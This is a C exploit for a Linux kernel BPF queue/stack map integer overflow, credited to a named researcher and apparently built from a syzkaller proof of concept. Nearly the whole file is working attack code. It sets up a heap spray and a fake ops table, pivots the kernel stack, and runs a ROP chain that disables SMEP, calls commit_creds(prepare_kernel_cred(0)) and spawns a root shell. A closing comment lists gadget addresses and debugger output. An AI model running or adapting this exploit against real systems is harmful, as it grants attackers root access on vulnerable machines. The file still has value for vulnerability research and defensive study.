// gcc -o exp exp.c -static -fno-pie
// exploit author: Wei Wu (ww9210@gmail.com)
// initial poc generated by syzkaller

#define _GNU_SOURCE
#define SPRAY_NUMBER 14

#include <signal.h>
#include <endian.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#define native_write_cr4 0xffffffff810037d5
#define POPRDX 0xffffffff81002dda                 // 0xffffffff81002dda: pop rdx; ret; 
#define PREPARE_KERNEL_CRED 0xFFFFFFFF810E3D40
#define COMMIT_CREDS  0xFFFFFFFF810E3AB0 
#define poprdiret 0xffffffff810013b9              // 0xffffffff810013b9: pop rdi; ret; 
#define popraxret 0xffffffff81029c71              // 0xffffffff81029c71: pop rax; ret; 
#define swapgs 0xffffffff81c00d5a                 // 0xffffffff81c00d5a: swapgs; popfq; ret; 
#define iretq 0xffffffff81081242                  // 0xffffffff81081242: iretq; ret; 
#define stack_pivot_gadget 0xffffffff81954dc8     // 0xffffffff81954dc8: xchg eax, esp; ret 0x674;  要选择对齐的xchg,  指令地址和返回偏移都得对齐。
#define stack_top_offset 0x674
#define krop_base_to_map 0x81954000
int rop_start=0x1444-8;    // dc8 + 0x674  =  0x143C  rop开始的地址
void* krop_base_mapped;

unsigned long user_cs, user_ss, user_rflags;

static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
        :
        : "memory");
}

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;

void get_shell()
{
  //commit_creds(prepare_kernel_cred(0));
  system("id");
  char *shell = "/bin/sh";
  char *args[] = {shell, NULL};
  execve(shell, args, NULL);
}

void get_root_payload(void)
{
    commit_creds(prepare_kernel_cred(0));
}
unsigned long rop_chain[] = {
    popraxret,
    0x6f0,
    0xffffffff810037d5,//native_write_cr4,    0xffffffff81001c51: ret  0xffffffff810037d5: mov cr4, rax; push rcx; popfq; ret;
    poprdiret,
    0,
    PREPARE_KERNEL_CRED,
    0xffffffff81001c50, // 0xffffffff81001c50: pop rsi; ret; 
    poprdiret,
    0xffffffff81264e0b,//  0xffffffff81264e0b: push rax; push rsi; ret;
    COMMIT_CREDS,
    swapgs,
    0x246,
    iretq,
    (unsigned long)&get_shell,
    0,//user_cs,
    0,//user_rflags,
    0,//krop_base_mapped + 0x4000,
    0//user_ss
};

void * fakestack;
void prepare_krop(){
    krop_base_mapped=mmap((void *)krop_base_to_map,0x8000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    if (krop_base_mapped<0){
        perror("mmap failed");
    }
    fakestack=mmap((void *)0xa000000000,0x8000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    *(unsigned long*)0x0000000081954dc8=popraxret;        // xchg eax,esp地址，但是ret 0x674，所以不会执行这个gadget(居然执行了，必须放这个！！)
    *(unsigned long*)krop_base_to_map = 0;
    *(unsigned long*)(krop_base_to_map+0x1000) = 0;
    *(unsigned long*)(krop_base_to_map+0x2000) = 0;
    *(unsigned long*)(krop_base_to_map+0x3000) = 0;
    *(unsigned long*)(krop_base_to_map+0x4000) = 0;
    *(unsigned long*)(krop_base_to_map+0x5000) = 0;
    *(unsigned long*)(krop_base_to_map+0x6000) = 0;
    *(unsigned long*)(krop_base_to_map+0x7000) = 0;
    *(unsigned long*)(fakestack+0x4000) = 0;
    *(unsigned long*)(fakestack+0x3000) = 0;
    *(unsigned long*)(fakestack+0x2000) = 0;
    *(unsigned long*)(fakestack+0x1000) = 0;
    *(unsigned long*)(fakestack) = 0;
    *(unsigned long*)(fakestack+0x10) = stack_pivot_gadget;     // 偏移0x10处对应  map_release函数指针
    *(unsigned long*)(fakestack+0x7000) = 0;
    *(unsigned long*)(fakestack+0x6000) = 0;
    *(unsigned long*)(fakestack+0x5000) = 0;
    rop_chain[7+7]=user_cs;
    rop_chain[8+7]=user_rflags;
    rop_chain[9+7]=(unsigned long)(fakestack + 0x6000);
    rop_chain[10+7]=user_ss;
    memcpy(krop_base_mapped+rop_start,rop_chain,sizeof(rop_chain));
    puts("rop_payload_initialized");
}

#ifndef __NR_bpf
#define __NR_bpf 321
#endif

uint64_t r[1] = {0xffffffffffffffff};

long victim[SPRAY_NUMBER];
void spray(){
    int i;
    for(i=0;i<SPRAY_NUMBER;i++){
        victim[i] = syscall(__NR_bpf, 0, 0x200011c0, 0x2c);
    }
    return;
}
void get_shell_again(){
  puts("SIGSEGV found");
  puts("get shell again");
  system("id");
  char *shell = "/bin/sh";
  char *args[] = {shell, NULL};
  execve(shell, args, NULL);
}
int main(void)
{
  signal(SIGSEGV,get_shell_again);
  syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
  long res = 0;
  *(uint32_t*)0x200011c0 = 0x17;   //  map_type         如何确定？？
  *(uint32_t*)0x200011c4 = 0;      //  key_size
  *(uint32_t*)0x200011c8 = 0x40;   //  value_size        需拷贝的用户字节数
  *(uint32_t*)0x200011cc = -1;     //  max_entries = 0xffffffff 构造整数溢出
  *(uint32_t*)0x200011d0 = 0;      //  map_flags
  *(uint32_t*)0x200011d4 = -1;     //  inner_map_fd
  *(uint32_t*)0x200011d8 = 0;      //  numa_node
  *(uint8_t*)0x200011dc = 0;
  *(uint8_t*)0x200011dd = 0;
  *(uint8_t*)0x200011de = 0;
  *(uint8_t*)0x200011df = 0;
  *(uint8_t*)0x200011e0 = 0;
  *(uint8_t*)0x200011e1 = 0;
  *(uint8_t*)0x200011e2 = 0;
  *(uint8_t*)0x200011e3 = 0;
  *(uint8_t*)0x200011e4 = 0;
  *(uint8_t*)0x200011e5 = 0;
  *(uint8_t*)0x200011e6 = 0;
  *(uint8_t*)0x200011e7 = 0;
  *(uint8_t*)0x200011e8 = 0;
  *(uint8_t*)0x200011e9 = 0;
  *(uint8_t*)0x200011ea = 0;
  *(uint8_t*)0x200011eb = 0;
  save_state();
  printf("user_cs:%llx   user_ss: %llx\n",user_cs,user_ss);
  prepare_krop();
  res = syscall(__NR_bpf, 0, 0x200011c0, 0x2c);
  if (res != -1)
    r[0] = res;
  spray();

  *(uint32_t*)0x200000c0 = r[0];       // map_fd   根据BPF_MAP_CREATE返回的编号找到对应的bpf对象
  *(uint64_t*)0x200000c8 = 0;          // key
  *(uint64_t*)0x200000d0 = 0x20000140; // value     输入的缓冲区
  *(uint64_t*)0x200000d8 = 2;          // flags     = BPF_EXIST =2  以免错误返回
  uint64_t* ptr = (uint64_t*)0x20000140;
  ptr[0]=1;
  ptr[1]=2;
  ptr[2]=3;
  ptr[3]=4;
  ptr[4]=5;
  ptr[5]=6;
  ptr[6]=0xa000000000; //从偏移0x30才开始覆盖。虚表指针ops在开头，但bpf_queue_stack管理结构大小0xd0，但是申请空间时需0x100对齐，0x100-0xd0=0x30。
  ptr[7]=8;
  syscall(__NR_bpf, 2, 0x200000c0, 0x20);
  int i;
  *(unsigned long*)(fakestack+0x7000) = 0;
  *(unsigned long*)(fakestack+0x6000) = 0;
  *(unsigned long*)(fakestack+0x5000) = 0;
  for(i=0;i<SPRAY_NUMBER;i++){
      close(victim[i]);
  }
  return 0;
}
/*
Gadget:
0xffffffff81002dda: pop rdx; ret; 
0xffffffff810013b9: pop rdi; ret; 
0xffffffff81029c71: pop rax; ret; 
0xffffffff81c00d5a: swapgs; popfq; ret; 
0xffffffff81081242: iretq; ret; 
0xffffffff81954dc8: xchg eax, esp; ret 0x674;    要选择对齐的xchg,  指令地址和返回偏移都得对齐。
0xffffffff813cc384: xchg eax, esp; ret 0x840;
0xffffffff815bb88a: xchg eax, esp; ret 0x88;
0xffffffff8101275a: xchg eax, esp; ret; 

0xffffffff81001c50: pop rsi; ret; 
0xffffffff82aff99b: mov rdi, rax; call rcx; 
0xffffffff81264e0b: push rax; push rsi; ret;

0xffffffff810037d5: mov cr4, rax; push rcx; popfq; ret;
0xffffffff810aec18: mov cr4, rdi; push rdx; popfq; ret;

(1)找到map_type确定方式
(2)找到跳转到map_release时寄存器情况，jmp eax??
/ # cat /proc/kallsyms | grep map_release
ffffffff8119d050 t bpf_map_release
ffffffff811a8b00 t bpffs_map_release
ffffffff81810070 t map_release

pwndbg> x /30i 0xffffffff8119d050
   0xffffffff8119d050:  push   rbx
   0xffffffff8119d051:  mov    rbx,QWORD PTR [rsi+0xc8]
   0xffffffff8119d058:  mov    rax,QWORD PTR [rbx]
   0xffffffff8119d05b:  mov    rax,QWORD PTR [rax+0x10]
   0xffffffff8119d05f:  test   rax,rax
   0xffffffff8119d062:  je     0xffffffff8119d06c
   0xffffffff8119d064:  mov    rdi,rbx
   0xffffffff8119d067:  call   0xffffffff81e057c0
   0xffffffff8119d06c:  mov    rdi,rbx
   0xffffffff8119d06f:  call   0xffffffff8119d010
   0xffffffff8119d074:  xor    eax,eax
   0xffffffff8119d076:  pop    rbx
   0xffffffff8119d077:  ret
.text:FFFFFFFF81E057C0                 jmp     rax

*/
